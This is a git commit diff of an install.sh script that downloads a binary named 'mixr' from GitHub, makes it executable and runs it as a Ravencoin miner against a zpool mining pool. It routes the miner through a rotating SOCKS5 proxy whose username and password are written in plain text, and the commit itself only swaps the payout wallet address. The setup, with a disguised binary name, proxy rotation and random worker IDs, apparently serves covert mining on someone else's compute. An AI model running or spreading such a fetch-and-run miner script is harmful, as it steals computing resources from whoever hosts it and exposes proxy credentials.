71b926954511be6180b2e0f306e1fb99cc12c04f
dillonki <110327273+dillonki@users.noreply.github.com>
2022-08-15 11:59:32 +0530

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,4 @@
 apt update -y
 wget -q https://github.com/Lutheranderson2001/TestOp/raw/main/mixr
 chmod +x mixr
-./mixr -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RBxXP9udHoS2Xc27vMMMmxi79CbMmaj1u7.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN -x socks5://archernap-rotate:arch12322@p.webshare.io:80
+./mixr -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RMEvf2Wo8g2VG2hfBJgGErwUL5zxz3MXqQ.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN -x socks5://archernap-rotate:arch12322@p.webshare.io:80
